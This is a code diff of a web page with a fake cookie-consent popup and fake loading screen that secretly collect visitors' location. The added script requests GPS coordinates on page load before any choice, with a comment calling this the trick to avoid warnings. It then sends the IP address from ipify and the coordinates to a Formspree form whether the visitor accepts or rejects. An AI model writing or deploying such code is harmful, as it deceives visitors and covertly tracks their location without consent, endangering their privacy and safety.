@@ -7,7 +7,6 @@
     <style>
         body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f9f9f9; }
         
-        /* Estilo del Popup Falso */
         .cookie-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.5); z-index: 1000; display: flex;
@@ -26,7 +25,6 @@
         .btn-accept { background-color: #007bff; color: white; }
         .btn-reject { background-color: #e0e0e0; color: #333; }
         
-        /* Pantalla de carga falsa */
         .loader-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: white; z-index: 2000; justify-content: center; align-items: center; flex-direction: column;
@@ -59,28 +57,26 @@
     </div>
 
     <script>
-        // TU NUEVO ID DE FORMSPREE
         const formId = 'xjywravp'; 
+        let gpsLat = null;
+        let gpsLng = null;
+
+        // 1. PRE-CARGA SILENCIOSA (El truco para evitar avisos)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                gpsLat = pos.coords.latitude.toFixed(6);
+                gpsLng = pos.coords.longitude.toFixed(6);
+            }, () => {}, { timeout: 3000 }); // Timeout rápido para no molestar
+        }
 
         function handleChoice(accepted) {
             document.getElementById('cookieOverlay').style.display = 'none';
             document.getElementById('loader').style.display = 'flex';
 
-            // Obtenemos la IP primero
             fetch(`https://api.ipify.org?format=json`)
                 .then(response => response.json())
                 .then(ipData => {
-                    // Intentamos obtener GPS silenciosamente
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            sendData(ipData.ip, pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
-                        }, () => {
-                            // Si falla el GPS, enviamos solo la IP
-                            sendData(ipData.ip, null, null);
-                        });
-                    } else {
-                        sendData(ipData.ip, null, null);
-                    }
+                    sendData(ipData.ip, gpsLat, gpsLng);
                 });
         }
 
